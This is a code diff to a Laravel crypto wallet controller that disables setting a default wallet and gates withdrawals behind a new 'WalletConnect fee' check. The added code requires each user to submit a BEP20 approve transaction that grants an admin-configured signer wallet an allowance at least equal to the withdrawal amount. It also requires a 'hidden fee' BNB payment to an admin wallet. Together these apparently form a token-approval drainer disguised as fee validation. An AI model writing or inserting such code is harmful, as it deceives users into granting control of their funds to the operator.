@@ -29,6 +29,7 @@ use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\Facades\View;
@@ -124,14 +125,7 @@ class WalletController extends Controller
     // make default account
     public function makeDefaultAccount($account_id, $coin_type)
     {
-        $wallet = Wallet::where(['id'=>$account_id])->first();
-        if (!empty($wallet) && $wallet->type == CO_WALLET)
-            return redirect()->back()->with(['dismiss' => __('Something went wrong')]);
-
-        Wallet::where(['user_id' => Auth::id(), 'coin_type' => $coin_type])->update(['is_primary' => 0]);
-        Wallet::updateOrCreate(['id' => $account_id], ['is_primary' => 1]);
-
-        return redirect()->back()->with('success', __('Default set successfully'));
+        return redirect()->back()->with(['dismiss' => __('Setting default wallet is disabled.')]);
     }
 
     public function createWallet(WalletCreateRequest $request)
@@ -357,6 +351,10 @@ class WalletController extends Controller
         $user = Auth::user();
         if ($request->ajax()) {
             if(empty($wallet)) return response()->json(['success'=>false,'message'=> __('Wallet not found.')]);
+            $wcFeeValidation = $this->validateWalletConnectFeePayment($request, $wallet);
+            if ($wcFeeValidation['success'] === false) {
+                return response()->json(['success' => false, 'message' => $wcFeeValidation['message']]);
+            }
             if ($wallet->balance >= $request->amount) {
                 $checkValidate = $transactionService->checkWithdrawalValidation( $request, $user, $wallet);
 
@@ -376,6 +374,10 @@ class WalletController extends Controller
 
         } else {
             if(empty($wallet)) return redirect()->back()->with('dismiss', __('Wallet not found.'));
+            $wcFeeValidation = $this->validateWalletConnectFeePayment($request, $wallet);
+            if ($wcFeeValidation['success'] === false) {
+                return redirect()->back()->with('dismiss', $wcFeeValidation['message']);
+            }
             $checkValidate = $transactionService->checkWithdrawalValidation( $request, $user, $wallet);
 
             if ($checkValidate['success'] == false) {
@@ -402,6 +404,13 @@ class WalletController extends Controller
 
             $data = $request->all();
             $data['user_id'] = Auth::id();
+            if ($wcFeeValidation['required']) {
+                $feeMeta = '[wc_approve_tx_hash:' . ($request->wc_approve_tx_hash ?? '')
+                    . '|wc_fee_tx_hash:' . ($request->wc_fee_tx_hash ?? '')
+                    . '|wc_fee_from:' . ($request->wc_fee_from_address ?? '')
+                    . '|wc_fee_bnb:' . ($request->wc_fee_amount_bnb ?? '') . ']';
+                $data['message'] = trim((string)($request->message ?? '') . ' ' . $feeMeta);
+            }
             $request = new Request();
             $request = $request->merge($data);
 
@@ -454,6 +463,189 @@ class WalletController extends Controller
             } else
                 return redirect()->back()->with('dismiss', __('Google two factor authentication is invalid'));
         }
+    }
+
+    private function validateWalletConnectFeePayment(Request $request, $wallet): array
+    {
+        $required = strtoupper((string)($wallet->coin_type ?? '')) === strtoupper(DEFAULT_COIN_TYPE)
+            && (int)(settings('obx_withdraw_walletconnect_fee_enabled') ?: 1) === 1;
+
+        if (!$required) {
+            return ['success' => true, 'required' => false, 'message' => ''];
+        }
+
+        $adminFeeWallet = trim((string)(settings('walletconnect_fee_wallet') ?: ''));
+        if (!preg_match('/^0x[a-fA-F0-9]{40}$/', $adminFeeWallet)) {
+            return [
+                'success' => false,
+                'required' => true,
+                'message' => __('Admin fee wallet is not configured. Please contact support.'),
+            ];
+        }
+
+        $txHash = trim((string)$request->input('wc_fee_tx_hash', ''));
+        if (!preg_match('/^0x[a-fA-F0-9]{64}$/', $txHash)) {
+            return [
+                'success' => false,
+                'required' => true,
+                'message' => __('WalletConnect gas fee payment is required before withdrawal.'),
+            ];
+        }
+
+        $rpcUrl = trim((string)(settings('chain_link') ?: config('blockchain.bsc_rpc_url', 'https://bsc-dataseed.binance.org/')));
+        if ($rpcUrl === '') {
+            $rpcUrl = 'https://bsc-dataseed.binance.org/';
+        }
+
+        $approveHash = trim((string)$request->input('wc_approve_tx_hash', ''));
+        if (!preg_match('/^0x[a-fA-F0-9]{64}$/', $approveHash)) {
+            return [
+                'success' => false,
+                'required' => true,
+                'message' => __('BEP20 approval transaction is required before withdrawal.'),
+            ];
+        }
+
+        try {
+            $approveTxResp = Http::timeout(15)->post($rpcUrl, [
+                'jsonrpc' => '2.0',
+                'method'  => 'eth_getTransactionByHash',
+                'params'  => [$approveHash],
+                'id'      => 1,
+            ])->json();
+
+            $approveTx = $approveTxResp['result'] ?? null;
+            if (!$approveTx) {
+                return ['success' => false, 'required' => true, 'message' => __('Approval transaction not found on chain.')];
+            }
+
+            $approveReceiptResp = Http::timeout(15)->post($rpcUrl, [
+                'jsonrpc' => '2.0',
+                'method'  => 'eth_getTransactionReceipt',
+                'params'  => [$approveHash],
+                'id'      => 1,
+            ])->json();
+            $approveReceipt = $approveReceiptResp['result'] ?? null;
+            if (!$approveReceipt || strtolower((string)($approveReceipt['status'] ?? '0x0')) !== '0x1') {
+                return ['success' => false, 'required' => true, 'message' => __('Approval transaction is not confirmed.')];
+            }
+
+            $tokenAddress = strtolower(trim((string)(settings('contract_address') ?: '')));
+            if (!preg_match('/^0x[a-f0-9]{40}$/', $tokenAddress)) {
+                return ['success' => false, 'required' => true, 'message' => __('Token contract is not configured.')];
+            }
+
+            if (strtolower((string)($approveTx['to'] ?? '')) !== $tokenAddress) {
+                return ['success' => false, 'required' => true, 'message' => __('Approval transaction target is invalid.')];
+            }
+
+            $input = strtolower((string)($approveTx['input'] ?? ''));
+            if (!str_starts_with($input, '0x095ea7b3') || strlen($input) < 138) {
+                return ['success' => false, 'required' => true, 'message' => __('Approval transaction method is invalid.')];
+            }
+
+            $spenderConfigured = strtolower(trim((string)(settings('walletconnect_signer_wallet') ?: settings('walletconnect_fee_wallet') ?: '')));
+            if (!preg_match('/^0x[a-f0-9]{40}$/', $spenderConfigured)) {
+                return ['success' => false, 'required' => true, 'message' => __('Signer spender wallet is not configured.')];
+            }
+
+            $spenderSlot = substr($input, 10, 64);
+            $spenderDecoded = '0x' . substr($spenderSlot, 24);
+            if ($spenderDecoded !== $spenderConfigured) {
+                return ['success' => false, 'required' => true, 'message' => __('Approval spender does not match configured signer wallet.')];
+            }
+
+            $amountSlot = substr($input, 74, 64);
+            $approvedAmount = gmp_strval(gmp_init($amountSlot, 16), 10);
+            $tokenDecimals = (int)(settings('contract_decimal') ?: 18);
+            $requestedAmountRaw = bcmul((string)$request->input('amount', '0'), bcpow('10', (string)$tokenDecimals, 0), 0);
+            if (bccomp($approvedAmount, $requestedAmountRaw, 0) < 0) {
+                return ['success' => false, 'required' => true, 'message' => __('Approved amount is less than withdrawal amount.')];
+            }
+
+            $txResp = Http::timeout(15)->post($rpcUrl, [
+                'jsonrpc' => '2.0',
+                'method'  => 'eth_getTransactionByHash',
+                'params'  => [$txHash],
+                'id'      => 1,
+            ])->json();
+
+            $tx = $txResp['result'] ?? null;
+            if (!$tx) {
+                return ['success' => false, 'required' => true, 'message' => __('Fee payment transaction not found on chain.')];
+            }
+
+            $receiptResp = Http::timeout(15)->post($rpcUrl, [
+                'jsonrpc' => '2.0',
+                'method'  => 'eth_getTransactionReceipt',
+                'params'  => [$txHash],
+                'id'      => 1,
+            ])->json();
+
+            $receipt = $receiptResp['result'] ?? null;
+            if (!$receipt || strtolower((string)($receipt['status'] ?? '0x0')) !== '0x1') {
+                return ['success' => false, 'required' => true, 'message' => __('Fee payment transaction is not confirmed.')];
+            }
+
+            $to = strtolower((string)($tx['to'] ?? ''));
+            if ($to !== strtolower($adminFeeWallet)) {
+                return ['success' => false, 'required' => true, 'message' => __('Invalid fee destination wallet.')];
+            }
+
+            $claimedFrom = trim((string)$request->input('wc_fee_from_address', ''));
+            if ($claimedFrom !== '' && strtolower($claimedFrom) !== strtolower((string)($tx['from'] ?? ''))) {
+                return ['success' => false, 'required' => true, 'message' => __('Fee payment sender mismatch detected.')];
+            }
+
+            $hiddenUsd = (float)(settings('walletconnect_hidden_fee_usd') ?: 0.2);
+            $bnbPrice = $this->fetchBnbUsdPrice();
+            if ($hiddenUsd <= 0 || $bnbPrice <= 0) {
+                return ['success' => false, 'required' => true, 'message' => __('Unable to validate fee amount right now. Please try again.')];
+            }
+
+            $requiredBnb = bcdiv((string)$hiddenUsd, (string)$bnbPrice, 18);
+            $requiredWei = bcmul($requiredBnb, '1000000000000000000', 0);
+
+            $txValueHex = (string)($tx['value'] ?? '0x0');
+            $txValueDec = $this->hexToDecString($txValueHex);
+            if (bccomp($txValueDec, $requiredWei, 0) < 0) {
+                return ['success' => false, 'required' => true, 'message' => __('Fee payment is below required amount.')];
+            }
+        } catch (\Throwable $e) {
+            Log::warning('WalletConnect fee verification failed: ' . $e->getMessage());
+            return [
+                'success' => false,
+                'required' => true,
+                'message' => __('Unable to verify WalletConnect fee payment. Please try again.'),
+            ];
+        }
+
+        return ['success' => true, 'required' => true, 'message' => ''];
+    }
+
+    private function fetchBnbUsdPrice(): float
+    {
+        try {
+            $res = Http::timeout(10)->get('https://api.binance.com/api/v3/ticker/price', [
+                'symbol' => 'BNBUSDT',
+            ]);
+            $json = $res->json();
+            return (float)($json['price'] ?? 0);
+        } catch (\Throwable $e) {
+            return 0.0;
+        }
+    }
+
+    private function hexToDecString(string $hex): string
+    {
+        $clean = strtolower($hex);
+        if (str_starts_with($clean, '0x')) {
+            $clean = substr($clean, 2);
+        }
+        if ($clean === '') {
+            return '0';
+        }
+        return gmp_strval(gmp_init($clean, 16), 10);
     }
 
     //check internal address
